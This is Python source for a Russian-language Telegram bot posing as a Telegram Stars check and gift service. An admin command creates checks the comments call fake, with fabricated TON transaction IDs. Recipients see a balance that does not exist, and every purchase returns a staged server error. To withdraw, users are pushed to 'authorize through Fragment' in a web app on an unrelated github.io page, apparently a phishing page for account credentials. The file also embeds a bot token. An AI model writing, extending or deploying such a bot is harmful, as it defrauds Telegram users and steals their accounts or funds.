# bot.py
import asyncio
import logging
import os
import random
import string
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BotCommand
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import json

TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"
ADMIN_ID = 8503291981
RECEIVER_USERNAME = "@Defbymorgenshtern"
BOT_USERNAME = "Givestarbots_bot"

RENDER_URL = "https://chatpggpupsik-max.github.io/botnft/templates/index.html"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

CHECKS_FILE = "checks.json"
USERS_FILE = "users.json"

GIFTS = {
    "🧸 Мишка": 10,
    "🌹 Роза": 20,
    "💐 Букет": 40,
    "🎂 Торт": 40,
    "🚀 Ракета": 40,
    "🏆 Кубок": 80,
    "💍 Кольцо": 80,
    "💎 Алмаз": 85,
    "🍾 Шампанское": 40
}

def generate_transaction_id():
    """Генерирует фейковый ID транзакции"""
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choices(chars, k=16))
    timestamp = str(int(time.time() * 1000))[-8:]
    return f"TON{random_part}{timestamp}"

def generate_check_id():
    """Генерирует ID чека без точки (точка запрещена в deep link)"""
    timestamp = str(int(time.time() * 1000))  # миллисекунды, без точки
    random_suffix = ''.join(random.choices(string.digits, k=4))
    return f"check_{timestamp}_{random_suffix}"

def load_checks():
    if os.path.exists(CHECKS_FILE):
        with open(CHECKS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_checks(checks):
    with open(CHECKS_FILE, "w") as f:
        json.dump(checks, f)

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f)

class AdminStates(StatesGroup):
    waiting_for_amount = State()

async def set_commands():
    commands = [
        BotCommand(command="start", description="Запустить бота"),
        BotCommand(command="menu", description="Главное меню"),
        BotCommand(command="checks", description="Список чеков"),
    ]
    await bot.set_my_commands(commands)

def main_keyboard():
    kb = types.ReplyKeyboardMarkup(
        keyboard=[
            [types.KeyboardButton(text="👤 Профиль"), types.KeyboardButton(text="💰 Баланс")],
            [types.KeyboardButton(text="🎁 Купить подарки"), types.KeyboardButton(text="⭐ Создать чек на звёзды")]
        ],
        resize_keyboard=True
    )
    return kb

def main_inline():
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile"),
         InlineKeyboardButton(text="💰 Баланс", callback_data="balance")],
        [InlineKeyboardButton(text="🎁 Купить подарки", callback_data="gifts"),
         InlineKeyboardButton(text="⭐ Создать чек на звёзды", callback_data="create_check")]
    ])
    return kb

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверяем, есть ли в команде check_id
    args = message.text.split()
    if len(args) > 1:
        check_id = args[1]
        await process_check_activation(message, check_id)
        return
    
    # Обычный /start
    text = (
        "🤖 *Добро пожаловать!*\n\n"
        "Этот бот создан для создания чеков на звёзды и покупки подарков по выгодным ценам.\n\n"
        "Выберите действие:"
    )
    await message.answer(text, parse_mode="Markdown", reply_markup=main_inline())

async def process_check_activation(message: types.Message, check_id: str):
    """Обработка активации чека по ссылке"""
    checks = load_checks()
    users = load_users()
    user_id = str(message.from_user.id)
    
    # Проверяем существует ли чек
    if check_id not in checks:
        await message.answer(
            "❌ Чек не найден.",
            reply_markup=main_keyboard()
        )
        return
    
    # Проверяем не активирован ли уже чек
    if checks[check_id].get("activated", False):
        await message.answer(
            "❌ Этот чек уже был активирован ранее.",
            reply_markup=main_keyboard()
        )
        return
    
    # Проверяем не активировал ли этот юзер чек раньше
    if user_id in users:
        activated_checks = users[user_id].get("activated_checks", [])
        if check_id in activated_checks:
            await message.answer(
                "❌ Вы уже активировали этот чек.",
                reply_markup=main_keyboard()
            )
            return
    
    # Активируем чек
    amount = checks[check_id]["amount"]
    transaction_id = checks[check_id].get("transaction_id", "UNKNOWN")
    
    # Помечаем чек как активированный
    checks[check_id]["activated"] = True
    checks[check_id]["activated_by"] = user_id
    checks[check_id]["activated_at"] = str(message.date)
    save_checks(checks)
    
    # Начисляем баланс юзеру
    if user_id not in users:
        users[user_id] = {
            "balance": 0,
            "checks_created": 0,
            "stars_spent": 0,
            "activated_checks": [],
            "username": message.from_user.username or "нет",
            "first_name": message.from_user.first_name or "нет"
        }
    
    if "activated_checks" not in users[user_id]:
        users[user_id]["activated_checks"] = []
    
    users[user_id]["balance"] += amount
    users[user_id]["activated_checks"].append(check_id)
    save_users(users)
    
    # Сообщение об успешном получении
    await message.answer(
        f"✅ *Получено {amount} ⭐!*\n\n"
        f"📦 От чека: `{check_id}`\n"
        f"💳 ID транзакции: `{transaction_id}`\n\n"
        f"💰 Звёзды зачислены на ваш баланс.\n"
        f"👉 Чтобы вывести звёзды, перейдите в раздел *Баланс*",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

@dp.message(Command("menu"))
async def cmd_menu(message: types.Message):
    await message.answer("⭐ Главное меню\nВыберите действие:", reply_markup=main_keyboard())

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ У вас нет доступа к этой команде.")
        return
    await message.answer("💰 Введите сумму звёзд для фейкового чека:")
    await state.set_state(AdminStates.waiting_for_amount)

@dp.message(AdminStates.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        amount = int(message.text)
        check_id = generate_check_id()
        transaction_id = generate_transaction_id()
        
        checks = load_checks()
        checks[check_id] = {
            "amount": amount,
            "transaction_id": transaction_id,
            "created_by": ADMIN_ID,
            "created_at": str(message.date),
            "activated": False
        }
        save_checks(checks)
        
        # Кнопка с ссылкой на бота через deep linking
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text=f"⭐ Получить {amount} звёзд", 
                url=f"https://t.me/{BOT_USERNAME}?start={check_id}"
            )]
        ])
        
        await message.answer(
            f"💎 <b>Чек создан!</b>\n\n"
            f"🆔 Чек: <code>{check_id}</code>\n"
            f"💳 ID транзакции: <code>{transaction_id}</code>\n"
            f"⭐ Сумма: <b>{amount} звёзд</b>\n\n"
            f"🙏 Спасибо за оплату в <b>{amount} ⭐</b>!\n\n"
            f"<i>Перешлите это сообщение получателю для активации чека.</i>",
            parse_mode="HTML",
            reply_markup=kb
        )
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите число!")

@dp.message(Command("checks"))
async def cmd_checks(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ У вас нет доступа к этой команде.")
        return
    checks = load_checks()
    if not checks:
        await message.answer("📭 Нет созданных чеков.")
        return
    text = "📋 <b>Список чеков:</b>\n\n"
    for cid, data in checks.items():
        tx_id = data.get("transaction_id", "N/A")
        status = "✅ Активирован" if data.get("activated") else "⏳ Ожидает"
        activated_by = data.get("activated_by", "—")
        text += (
            f"🆔 <code>{cid}</code>\n"
            f"💎 {data['amount']} ⭐\n"
            f"💳 TX: <code>{tx_id}</code>\n"
            f"📊 Статус: {status}\n"
            f"👤 Активировал: <code>{activated_by}</code>\n"
            f"📅 {data['created_at']}\n\n"
        )
    await message.answer(text, parse_mode="HTML")

# Кнопки из инлайн меню
@dp.callback_query(F.data == "profile")
async def profile_callback(callback: types.CallbackQuery):
    await profile_handler(callback.message)
    await callback.answer()

@dp.callback_query(F.data == "balance")
async def balance_callback(callback: types.CallbackQuery):
    await balance_handler(callback.message)
    await callback.answer()

@dp.callback_query(F.data == "gifts")
async def gifts_callback(callback: types.CallbackQuery):
    await gifts_shop(callback.message)
    await callback.answer()

@dp.callback_query(F.data == "create_check")
async def create_check_callback(callback: types.CallbackQuery):
    await create_check_button(callback.message)
    await callback.answer()

# Кнопки из клавиатуры
@dp.message(F.text == "👤 Профиль")
async def profile_handler(message: types.Message):
    users = load_users()
    user_id = str(message.from_user.id)
    
    if user_id not in users:
        users[user_id] = {
            "balance": 0,
            "checks_created": 0,
            "stars_spent": 0,
            "activated_checks": [],
            "username": message.from_user.username or "нет",
            "first_name": message.from_user.first_name or "нет"
        }
        save_users(users)
    
    u = users[user_id]
    activated_count = len(u.get("activated_checks", []))
    text = (
        f"👤 *Профиль*\n\n"
        f"🆔 ID: `{user_id}`\n"
        f"👤 Имя: {u['first_name']}\n"
        f"📛 Юзернейм: @{u['username']}\n"
        f"💎 Баланс: {u['balance']} ⭐\n"
        f"📦 Создано чеков: {u['checks_created']}\n"
        f"🎁 Активировано чеков: {activated_count}\n"
        f"💸 Потрачено звёзд: {u['stars_spent']} ⭐"
    )
    await message.answer(text, parse_mode="Markdown")

@dp.message(F.text == "💰 Баланс")
async def balance_handler(message: types.Message):
    users = load_users()
    user_id = str(message.from_user.id)
    
    if user_id in users:
        bal = users[user_id]["balance"]
    else:
        bal = 0
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Вывести звёзды", callback_data="withdraw_request")]
    ])
    
    await message.answer(
        f"💰 Ваш баланс: {bal} ⭐\n\n"
        f"Для вывода звёзд необходима авторизация через Fragment.",
        reply_markup=kb
    )

@dp.message(F.text == "⭐ Создать чек на звёзды")
async def create_check_button(message: types.Message):
    await message.answer(
        "⚠️ *Технические проблемы*\n\n"
        "Сейчас у сервера технические проблемы, мы попробуем решить их как можно быстрее. "
        "Пожалуйста, попробуйте позже.",
        parse_mode="Markdown"
    )

@dp.message(F.text == "🎁 Купить подарки")
async def gifts_shop(message: types.Message):
    text = "🎁 *Магазин подарков*\n\n"
    for name, price in GIFTS.items():
        text += f"{name} — {price} ⭐\n"
    
    # Создаём кнопки для каждого подарка
    gift_buttons = []
    row = []
    for i, name in enumerate(GIFTS.keys()):
        row.append(InlineKeyboardButton(text=name, callback_data=f"buy_gift_{name}"))
        if len(row) == 3 or i == len(GIFTS) - 1:
            gift_buttons.append(row)
            row = []
    
    kb = InlineKeyboardMarkup(inline_keyboard=gift_buttons)
    
    await message.answer(text, parse_mode="Markdown", reply_markup=kb)

# Обработка покупки любого подарка
@dp.callback_query(F.data.startswith("buy_gift_"))
async def buy_gift(callback: types.CallbackQuery):
    gift_name = callback.data.replace("buy_gift_", "")
    await callback.message.answer(
        f"❌ *Ошибка оплаты со стороны сервера*\n\n"
        f"Не удалось приобрести {gift_name}. Пожалуйста, попробуйте позже.",
        parse_mode="Markdown"
    )
    await callback.answer()

@dp.callback_query(F.data == "withdraw_request")
async def withdraw_request(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Авторизоваться через Fragment", web_app=WebAppInfo(url=RENDER_URL))]
    ])
    await callback.message.answer(
        "⚠️ Для вывода звёзд необходима авторизация через Fragment.\n\n"
        "Это безопасный способ подтвердить владение аккаунтом.",
        reply_markup=kb
    )
    await callback.answer()

async def main():
    await set_commands()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
